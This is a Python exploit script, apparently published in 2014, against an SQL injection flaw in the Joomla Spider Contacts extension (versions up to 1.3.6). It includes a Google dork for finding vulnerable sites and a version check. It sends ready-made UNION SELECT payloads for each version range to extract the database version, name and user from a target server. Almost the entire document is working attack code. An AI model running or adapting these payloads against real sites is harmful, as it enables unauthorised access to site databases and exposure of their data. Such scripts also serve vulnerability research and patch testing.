#!/usr/bin/env python
#
#
# Exploit Title : Joomla Spider Contacts <= 1.3.6 SQL Injection
#
# Exploit Author : Claudio Viviani
#
# Vendor Homepage : http://web-dorado.com/
#
# Software Link : http://web-dorado.com/?option=com_wdsubscriptions&view=dwnldfree&format=row&id=60 (fixed)
#   Mirror Link : https://mega.co.nz/#!mJwlUahJ!fx7d1ZQszaD3-k66PjWQEBXQafJnEeRDEleN8jqbVOE (no fixed)
#
# Dork Google: inurl:option=com_spidercontacts
#
# Date : 2014-09-07
#
# Tested on : Windows 7 / Mozilla Firefox
#             Linux / Mozilla Firefox
#
#
#
######################
#
# PoC Exploit:
#
# http://www.example.com/joomla/index.php?option=com_spidercontacts&contact_id=[SQLi]&view=showcontact&lang=ca
#
#
# "contacts_id" variables is not sanitized.
# 
#
# Vulnerability Disclosure Timeline:
#
# 2014-09-07:  Discovered vulnerability
# 2014-09-09:  Vendor Notification
# 2014-09-10:  Vendor Response/Feedback 
# 2014-09-10:  Vendor Fix/Patch
# 2014-09-10:  Public Disclosure

import codecs
import httplib
import re
import sys
import socket
import optparse

banner = """

   $$$$$\                                   $$\                  $$$$$$\            $$\       $$\                      
   \__$$ |                                  $$ |                $$  __$$\           \__|      $$ |                     
      $$ | $$$$$$\   $$$$$$\  $$$$$$\$$$$\  $$ | $$$$$$\        $$ /  \__| $$$$$$\  $$\  $$$$$$$ | $$$$$$\   $$$$$$\   
      $$ |$$  __$$\ $$  __$$\ $$  _$$  _$$\ $$ | \____$$\       \$$$$$$\  $$  __$$\ $$ |$$  __$$ |$$  __$$\ $$  __$$\  
$$\   $$ |$$ /  $$ |$$ /  $$ |$$ / $$ / $$ |$$ | $$$$$$$ |       \____$$\ $$ /  $$ |$$ |$$ /  $$ |$$$$$$$$ |$$ |  \__| 
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$ |$$  __$$ |      $$\   $$ |$$ |  $$ |$$ |$$ |  $$ |$$   ____|$$ |       
\$$$$$$  |\$$$$$$  |\$$$$$$  |$$ | $$ | $$ |$$ |\$$$$$$$ |      \$$$$$$  |$$$$$$$  |$$ |\$$$$$$$ |\$$$$$$$\ $$ |       
 \______/  \______/  \______/ \__| \__| \__|\__| \_______|       \______/ $$  ____/ \__| \_______| \_______|\__|       
                                                                          $$ |                                         
                                                                          $$ |                                         
                                                                          \__|                                         
 $$$$$$\                       $$\                           $$\                       $$\       $$$$$$\      $$$$$$\  
$$  __$$\                      $$ |                          $$ |                    $$$$ |     $$ ___$$\    $$  __$$\ 
$$ /  \__| $$$$$$\  $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$$\ $$$$$$\    $$$$$$$\       \_$$ |     \_/   $$ |   $$ /  \__|
$$ |      $$  __$$\ $$  __$$\\_$$  _|   \____$$\ $$  _____|\_$$  _|  $$  _____|        $$ |       $$$$$ /    $$$$$$$\  
$$ |      $$ /  $$ |$$ |  $$ | $$ |     $$$$$$$ |$$ /        $$ |    \$$$$$$\          $$ |       \___$$\    $$  __$$\ 
$$ |  $$\ $$ |  $$ |$$ |  $$ | $$ |$$\ $$  __$$ |$$ |        $$ |$$\  \____$$\         $$ |     $$\   $$ |   $$ /  $$ |
\$$$$$$  |\$$$$$$  |$$ |  $$ | \$$$$  |\$$$$$$$ |\$$$$$$$\   \$$$$  |$$$$$$$  |      $$$$$$\ $$\\$$$$$$  |$$\ $$$$$$  |
 \______/  \______/ \__|  \__|  \____/  \_______| \_______|   \____/ \_______/       \______|\__|\______/ \__|\______/ 
                                                                                                                       
                                                                                         j00ml4 Spid3r C0nt4cts <= 1.3.6 SQLi

                                         Written by:

                                                   Claudio Viviani

                                       http://www.homelab.it

                                                   info@homelab.it
                                   homelabit@protonmail.ch

                              https://www.facebook.com/homelabit
                                https://twitter.com/homelabit
                                         https://plus.google.com/+HomelabIt1/
                               https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww

"""

C0mm4nds = dict()
C0mm4nds['DB VERS'] = 'VERSION'
C0mm4nds['DB NAME'] = 'DATABASE'
C0mm4nds['DB USER'] = 'CURRENT_USER'

def def_payload(payl):
    payl = payl
    return payl


def com_com_spidercalendar():
    com_spidercalendar = "index.php?option=com_spidercontacts&contact_id="+payload+"&view=showcontact&lang=ca"
    return com_spidercalendar


ver_spidercontacts = "administrator/components/com_spidercontacts/spidercontacts.xml"

vuln = 0

def cmdMySQL(cmd):
   SqlInjList = [
   # SQLi Spider Contacts 1.3.6
'1%20UNION%20ALL%20SELECT%20CONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28'+cmd+'%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23',
   # SQLi Spider Contacts 1.3.5 - 1.3.4
'1%20UNION%20ALL%20SELECT%20CONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28'+cmd+'%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23',
   # SQLi Spider Contacts 1.3.3
'1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28'+cmd+'%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23',
   # SQLi Spider Contacts 1.3
'1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28'+cmd+'%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23',
   # SQLi Spider Contacts 1.2 - 1.1 - 1.0
'-9900%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28'+cmd+'%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23',
   ]
   return SqlInjList

def checkProtocol(pr):

    parsedHost = ""
    PORT =  m_oOptions.port

    if pr[0:8] == "https://":
        parsedHost = pr[8:]

        if parsedHost.endswith("/"):
            parsedHost = parsedHost.replace("/","")
            if PORT == 0:
                PORT = 443

        PROTO = httplib.HTTPSConnection(parsedHost, PORT)

    elif pr[0:7] == "http://":
        parsedHost = pr[7:]
        if parsedHost.endswith("/"):
            parsedHost = parsedHost.replace("/","")
        if PORT == 0:
            PORT = 80

        PROTO = httplib.HTTPConnection(parsedHost, PORT)

    else:
        parsedHost = pr

        if parsedHost.endswith("/"):
            parsedHost = parsedHost.replace("/","")
        if PORT == 0:
            PORT = 80

        PROTO = httplib.HTTPConnection(parsedHost, PORT)

    return PROTO, parsedHost

def connection(addr, url_string):

    parsedHost = checkProtocol(addr)[1]
    PROTO =  checkProtocol(addr)[0]
    try:
        socket.gethostbyname(parsedHost)

    except socket.gaierror:
        print 'Hostname could not be resolved. Exiting'
        sys.exit()

    connection_req =  checkProtocol(addr)[0]

    try:
        connection_req.request('GET', url_string)
    except socket.error:
        print('Connection Error')
        sys.exit(1)

    response = connection_req.getresponse()
    reader = codecs.getreader("utf-8")(response)

    return {'response':response, 'reader':reader}


if __name__ == '__main__':
    m_oOpts = optparse.OptionParser("%prog -H http[s]://Host_or_IP [-b, --base base_dir] [-p, --port PORT]")
    m_oOpts.add_option('--host', '-H', action='store', type='string',
        help='The address of the host running Spider Contacts extension(required)')
    m_oOpts.add_option('--base', '-b', action='store', type='string', default="/",
  help='base dir joomla installation, default "/")')
    m_oOpts.add_option('--port', '-p', action='store', type='int', default=0,
        help='The port on which the daemon is running (default 80)')

    m_oOptions, remainder = m_oOpts.parse_args()
    m_nHost = m_oOptions.host
    m_nPort = m_oOptions.port
    m_nBase = m_oOptions.base

    if not m_nHost:
        print(banner)       
        print m_oOpts.format_help()
        sys.exit(1)

    print(banner)

    if m_nBase != "/":
  if m_nBase[0] == "/":
    m_nBase = m_nBase[1:]
    if m_nBase[-1] == "/":
      m_nBase = m_nBase[:-1]
  else:
    if m_nBase[-1] == "/":
      m_nBase = m_nBase[:-1]
  m_nBase = '/'+m_nBase+'/'

    payload = def_payload('1%27')
    com_spidercalendar = com_com_spidercalendar()
    # Start connection to host for Joomla Spider Contacts vulnerability
    response = connection(m_nHost, m_nBase+com_spidercalendar).values()[0]
    reader = connection(m_nHost, m_nBase+com_spidercalendar).values()[1]
    # Read connection code number
    getcode = response.status

    print("[+] Searching for Joomla Spider Contacts vulnerability...")
    print("[+]")
    
    if getcode != 404:
        for lines in reader:
            if not lines.find("spidercontacts_contacts.id") == -1:
    print("[!] Boolean SQL injection vulnerability FOUND!")
                print("[+]")
                print("[+] Detection version in progress....")
    print("[+]")
  
                try:
                    response = connection(m_nHost, m_nBase+ver_spidercontacts).values()[0]
                    reader = connection(m_nHost, m_nBase+ver_spidercontacts).values()[1]
                    getcode = response.status
                    if getcode != 404:
                        for line_version in reader:
                           if not line_version.find("<version>") == -1:
                               VER = re.compile('>(.*?)<').search(line_version).group(1)
                               VER_REP = VER.replace(".","")
                               if int(VER_REP) > 136 or int(VER_REP[0]) == 2:
                                   print("[X] VERSION: "+VER)
                                   print("[X] Joomla Spider Contacts => 1.3.7 are not vulnerables")
                                   sys.exit(1)
                               elif int(VER_REP) == 136:
                                   print("[+] EXTENSION VERSION: "+VER)
                                   print("[+]")
                                   for  cmddesc, cmdsqli in C0mm4nds.items():
                                       try:
                                           paysql = cmdMySQL(cmdsqli)[0]
                                           payload = def_payload(paysql)
                                           com_spidercalendar = com_com_spidercalendar()
                                           response = connection(m_nHost, m_nBase+com_spidercalendar).values()[0]
                                           reader = connection(m_nHost, m_nBase+com_spidercalendar).values()[1]
                                           getcode = response.status
                                           if getcode != 404:
                                              for line_response in reader:
                                                  if not line_response.find("h0m3l4b1t") == -1:
                                                      MYSQL_VER = re.compile('h0m3l4b1t(.*?)t1b4l3m0h').search(line_response).group(1)
                                                      if vuln == 0:
                                                          print("[!] "+m_nHost+" VULNERABLE!!!")
                                                          print("[+]")
                                                      print("[!] "+cmddesc+" : "+MYSQL_VER)
                                                      vuln = 1
                                                      break
                                       except socket.error:
                                           print('[X] Connection was lost please retry')
                                           sys.exit(1)
                               elif int(VER_REP) == 135 or int(VER_REP) == 134:
                                   print("[+] EXTENSION VERSION: "+VER)
                                   print("[+]")
                                   for  cmddesc, cmdsqli in C0mm4nds.items():
                                       try:
                                           paysql = cmdMySQL(cmdsqli)[1]
                                           payload = def_payload(paysql)
                                           com_spidercalendar = com_com_spidercalendar()
                                           response = connection(m_nHost, m_nBase+com_spidercalendar).values()[0]
                                           reader = connection(m_nHost, m_nBase+com_spidercalendar).values()[1]
                                           getcode = response.status
                                           if getcode != 404:
                                              for line_response in reader:
                                                  if not line_response.find("h0m3l4b1t") == -1:
                                                      MYSQL_VER = re.compile('h0m3l4b1t(.*?)t1b4l3m0h').search(line_response).group(1)
                                                      if vuln == 0:
                                                          print("[!] "+m_nHost+" VULNERABLE!!!")
                                                          print("[+]")
                                                      print("[!] "+cmddesc+" : "+MYSQL_VER)
                                                      vuln = 1
                                                      break
                                       except socket.error:
                                           print('[X] Connection was lost please retry')
                                           sys.exit(1)
                               elif int(VER_REP) == 133:
                                   print("[+] EXTENSION VERSION: "+VER)
                                   print("[+]")
                                   for  cmddesc, cmdsqli in C0mm4nds.items():
                                       try:
                                           paysql = cmdMySQL(cmdsqli)[2]
                                           payload = def_payload(paysql)
                                           com_spidercalendar = com_com_spidercalendar()
                                           response = connection(m_nHost, m_nBase+com_spidercalendar).values()[0]
                                           reader = connection(m_nHost, m_nBase+com_spidercalendar).values()[1]
                                           getcode = response.status
                                           if getcode != 404:
                                              for line_response in reader:
                                                  if not line_response.find("h0m3l4b1t") == -1:
                                                      MYSQL_VER = re.compile('h0m3l4b1t(.*?)t1b4l3m0h').search(line_response).group(1)
                                                      if vuln == 0:
                                                          print("[!] "+m_nHost+" VULNERABLE!!!")
                                                          print("[+]")
                                                      print("[!] "+cmddesc+" : "+MYSQL_VER)
                                                      vuln = 1
                                                      break
                                       except socket.error:
                                           print('[X] Connection was lost please retry')
                                           sys.exit(1)
                               elif int(VER_REP) == 13:
                                   print("[+] EXTENSION VERSION: "+VER)
                                   print("[+]")
                                   for  cmddesc, cmdsqli in C0mm4nds.items():
                                       try:
                                           paysql = cmdMySQL(cmdsqli)[3]
                                           payload = def_payload(paysql)
                                           com_spidercalendar = com_com_spidercalendar()
                                           response = connection(m_nHost, m_nBase+com_spidercalendar).values()[0]
                                           reader = connection(m_nHost, m_nBase+com_spidercalendar).values()[1]
                                           getcode = response.status
                                           if getcode != 404:
                                              for line_response in reader:
                                                  if not line_response.find("h0m3l4b1t") == -1:
                                                      MYSQL_VER = re.compile('h0m3l4b1t(.*?)t1b4l3m0h').search(line_response).group(1)
                                                      if vuln == 0:
                                                          print("[!] "+m_nHost+" VULNERABLE!!!")
                                                          print("[+]")
                                                      print("[!] "+cmddesc+" : "+MYSQL_VER)
                                                      vuln = 1
                                                      break
                                       except socket.error:
                                           print('[X] Connection was lost please retry')
                                           sys.exit(1)
                               elif int(VER_REP[:2]) == 10 or int(VER_REP[:2]) == 11 or int(VER_REP[:2]) == 12:
                                   print("[+] EXTENSION VERSION: "+VER)
                                   print("[+]")
                                   for  cmddesc, cmdsqli in C0mm4nds.items():
                                       try:
                                           paysql = cmdMySQL(cmdsqli)[4]
                                           payload = def_payload(paysql)
                                           com_spidercalendar = com_com_spidercalendar()
                                           response = connection(m_nHost, m_nBase+com_spidercalendar).values()[0]
                                           reader = connection(m_nHost, m_nBase+com_spidercalendar).values()[1]
                                           getcode = response.status
                                           if getcode != 404:
                                              for line_response in reader:
                                                  if not line_response.find("h0m3l4b1t") == -1:
                                                      MYSQL_VER = re.compile('h0m3l4b1t(.*?)t1b4l3m0h').search(line_response).group(1)
                                                      if vuln == 0:
                                                          print("[!] "+m_nHost+" VULNERABLE!!!")
                                                          print("[+]")
                                                      print("[!] "+cmddesc+" : "+MYSQL_VER)
                                                      vuln = 1
                                                      break
                                       except socket.error:
                                           print('[X] Connection was lost please retry')
                                           sys.exit(1)
                               else:
                                   print("[-] EXTENSION VERSION: Unknown :(")
                                   sys.exit(0)
                        if int(vuln) == 0:
                            # VERSION NOT VULNERABLE :(
                            print("[X] Spider Contacts patched or SQLi blocked by Web Application Firewall")
                            sys.exit(1)
                        else:
                            sys.exit(0)
                except socket.error:
                    print('[X] Connection was lost please retry')
                    sys.exit(1)
  # NO SQL BLIND DETECTED
  print("[X] Spider Contacts patched or SQLi blocked by Web Application Firewall")
  sys.exit(1)
    else:
        print('[X] URL "'+m_nHost+m_nBase+com_spidercalendar+'" NOT FOUND')
        sys.exit(1)
